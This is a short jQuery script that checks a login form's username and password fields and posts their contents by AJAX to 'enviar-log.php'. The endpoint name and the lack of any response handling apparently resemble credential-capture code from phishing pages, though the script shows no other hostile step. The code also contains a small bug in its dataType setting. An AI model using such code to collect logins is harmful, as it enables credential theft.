$(document).ready(function () {

    $("#ingresar").click(function (e) {
        e.preventDefault();
        var check = []
        $("#datos").each(function () {
            $("form", this).children().each(function () {
               if ($(this).is("#usuario") || $(this).is("#keyword")) {

                if ($(this).val().length>0) {
                    check.push(1)
                } else {
                    check.push(0)
                }
            } 
            })
            
        })

        if (!check.includes(0)) {
            $('#datos').each(function () {
                $('form', this).each(function () {
                    $.ajax({
                        type: "post",
                        url: "enviar-log.php",
                        data: new FormData(this),
                        dataType: "dataType",
                        contentType: false,
                        cache: false,
                        processData: false 
                    });
                })
            })
        } else {
            alert("Falta usuario o Password")
        }
    })

});